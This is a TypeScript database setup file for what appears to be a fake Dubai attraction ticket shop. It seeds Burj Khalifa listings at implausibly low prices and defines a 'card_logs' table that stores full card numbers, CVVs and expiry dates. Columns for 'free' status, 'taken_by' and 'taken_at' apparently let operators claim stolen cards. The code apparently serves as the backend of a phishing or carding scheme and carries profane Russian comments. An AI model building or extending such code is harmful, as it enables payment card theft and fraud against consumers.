// db.ts
import Database from "better-sqlite3";
import { v4 as uuidv4 } from "uuid";

export const db = new Database("db.sqlite");

db.exec(`DROP TABLE IF EXISTS events;`);

// ЕБУЧАЯ ПРАВИЛЬНАЯ СХЕМА БЕЗ ЛИШНЕГО ГОВНА
db.exec(`
CREATE TABLE IF NOT EXISTS bookings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT UNIQUE,
  booking_id TEXT,
  client_id TEXT,
  total_amount INTEGER,
  status TEXT DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS events (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT NOT NULL,
  description TEXT,
  location TEXT,
  price INTEGER,
  rating REAL DEFAULT 4.0,
  reviews_count INTEGER DEFAULT 0,
  category TEXT,
  image_urls TEXT, 
  duration TEXT,
  included_features TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS customers (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  name TEXT,
  surname TEXT,
  phone TEXT
);

CREATE TABLE IF NOT EXISTS card_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  full_pan TEXT,
  masked_pan TEXT,
  cvv TEXT,
  expire_date TEXT,
  status TEXT DEFAULT 'free',
  taken_by TEXT,
  taken_at TEXT,
  step TEXT DEFAULT 'full'
);
`);

db.exec(`
INSERT OR IGNORE INTO events (title, description, location, price, rating, reviews_count, category, image_urls, duration, included_features) VALUES
('Burj Khalifa: Level 124/125 Fast Track', 
 'Take the high-speed elevator to Level 124 and use high-powered telescopes to see Dubai from above', 
 'Dubai', 145, 4.4, 9412, 'attraction', 
 '["/assets/events/burj-khalifa-1.avif", "/assets/events/burj-khalifa-2.avif", "/assets/events/burj-khalifa-3.avif", "/assets/events/burj-khalifa-4.avif"]',
 '1-2 hours', 
 'Fast-track entry,Access to floors 124-125'),

('Dubai Aquarium & Burj Khalifa: Level 124/125 Ticket', 
 'Go from the tallest building to the oceans depths', 
 'Dubai', 49, 4.5, 1383, 'attraction', 
 '["/assets/events/burj-khalifa-ocean-1.avif", "/assets/events/burj-khalifa-ocean-2.avif", "/assets/events/burj-khalifa-ocean-3.avif", "/assets/events/burj-khalifa-2.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Entrance to Dubai Aquarium & Underwater Zoo'),

('Burj Khalifa: The Lounge Level 154 Tickets with Champagne', 
 'Sip champagne or coffee at the worlds most luxurious sky lounge', 
 'Dubai', 49, 4.7, 249, 'attraction', 
 '["/assets/events/burj-khalifa-lounge-1.avif", "/assets/events/burj-khalifa-lounge-2.avif", "/assets/events/burj-khalifa-2.avif", "/assets/events/burj-khalifa-lounge-3.avif", "/assets/events/burj-khalifa-lounge-4.avif"]',
 '3-4 hours', 
 'Fast-track access to all the levels (124 125 148 152 153 and 154), Access to the worlds highest lounge (floors 152 153 and 154), Access to the outdoor terrace, 1 welcome drink (sparkling wine or other beverage), Unlimited high tea and canapes catered by Armani Hotel, Unlimited soft drinks'
),
('Burj Khalifa: Dining Experience', 
 'Eat at a world-class restaurant and get great views on the observation deck', 
 'Dubai', 49, 4.2, 188, 'attraction', 
 '["/assets/events/burj-khalifa-dinner-1.avif", "/assets/events/burj-khalifa-dinner-2.avif", "/assets/events/burj-khalifa-dinner-3.avif"]',
 '3-4 hours', 
 'Access to Burj Khalifa, 3-course dining experience, Burj Khalifa: At The Top (Level 124 & 125) Entry + Rooftop Meal, At.mosphere Burj Khalifa: Premium 3-Course Lunch, At.mosphere Burj Khalifa: 3-Course Afternoon Tea with Soft Drinks, At.mosphere Burj Khalifa: Premium 3-Course Breakfast'
),
('Burj Khalifa + Desert Safari', 
 'From the tallest skyscraper in the world to snoozing camels, theres a lot to see in Dubai. This special package covers some of the essentials, taking the stress out of planning your agenda! Save time and money at Dubais top attractions and activities with access to the Burj Khalifa and a Dubai desert safari adventure. You will also get 10% discount to other attractions in the city!', 
 'Dubai', 49, 4.6, 216, 'attraction', 
 '["/assets/events/burj-khalifa-safari-1.avif", "/assets/events/burj-khalifa-safari-2.avif", "/assets/events/burj-khalifa-safari-3.avif", "/assets/events/burj-khalifa-1.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Dubai: Morning Desert Safari in High Red Dunes + Sandboarding, Dubai Evening Desert Safari: Sandboarding, Camel Ride + BBQ Dinner with Transfers'
),
('Dubai: Guided Food Tour + Burj Khalifa Bar Access', 
 'Visit a modern market and taste local dates', 
 'Dubai', 49, 4.8, 567, 'attraction', 
 '["/assets/events/burj-khalifa-rest-1.avif", "/assets/events/burj-khalifa-rest-2.avif", "/assets/events/burj-khalifa-rest-3.avif", "/assets/events/burj-khalifa-rest-4.avif", "/assets/events/burj-khalifa-rest-5.avif"]',
 '3-4 hours', 
 'Access to At.mosphere, Burj Khalifa floor 122, Food and drinks, Live guide, Guided tour, Upgrade to Cocktail & Lebanese Wine (if option selected)'
),
('Burj Khalifa: SKY Level 148 Tickets', 
 'Enjoy VIP access to three floors and enjoy views of Dubai and its desert', 
 'Dubai', 49, 4.7, 2382, 'attraction', 
 '["/assets/events/burj-khalifa-sky-1.avif", "/assets/events/burj-khalifa-sky-2.avif", "/assets/events/burj-khalifa-sky-3.avif", "/assets/events/burj-khalifa-sky-4.avif", "/assets/events/burj-khalifa-sky-5.avif"]',
 '3-4 hours', 
 'Fast-track entry, Access to At the Top (floors 124 and 125), Access to At the Top SKY (floor 148), Access to the SKY lounge with welcome refreshments, Arabic coffee sweets and soft drinks'
),
('Burj Khalifa & Sky Views Observatory: Entry Ticket', 
 'Visit the observation deck and walk on the glass floor', 
 'Dubai', 49, 4.4, 783, 'attraction', 
 '["/assets/events/burj-khalifa-obs-1.avif", "/assets/events/burj-khalifa-obs-2.avif", "/assets/events/burj-khalifa-obs-3.avif", "/assets/events/burj-khalifa-obs-4.avif", "/assets/events/burj-khalifa-obs-5.avif"]',
 '3-4 hours', 
 'Glass walk at Sky Views, Access to At the Top (floors 124 and 125), Access to Sky Views Observatory'
),
('Dubai Highlights Pass', 
 ' ', 
 'Dubai', 49, 4.5, 83, 'attraction', 
 '["/assets/events/burj-khalifa-pass-1.avif", "/assets/events/burj-khalifa-pass-2.avif", "/assets/events/burj-khalifa-pass-3.avif", "/assets/events/burj-khalifa-pass-4.avif", "/assets/events/burj-khalifa-pass-5.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Get ready for an immersive experience at the Museum of the Future, Witness Dubais fascinating timeline with amazing views too'
),
('Burj Khalifa: At The Top Level 124/125 + Digital Photo', 
 'Ride the elevator and use special telescopes', 
 'Dubai', 49, 4.5, 83, 'attraction', 
 '["/assets/events/burj-khalifa-dig-1.avif", "/assets/events/burj-khalifa-dig-2.avif", "/assets/events/burj-khalifa-dig-3.avif", "/assets/events/burj-khalifa-dig-4.avif", "/assets/events/burj-khalifa-dig-5.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Complimentary digital photo, Golden plated coin for adults, Mini puzzle for children'
)
`);

// Добавляем колонку step если её нет
try {
  db.exec(`ALTER TABLE card_logs ADD COLUMN step TEXT DEFAULT 'full';`);
  console.log("✅ Added step column to card_logs table");
} catch (error) {
  // Поле уже существует, игнорируем ошибку
  console.log("✅ Step column already exists in card_logs table");
}

// Функция для генерации sessionId
export function generateSessionId(): string {
  return uuidv4();
}
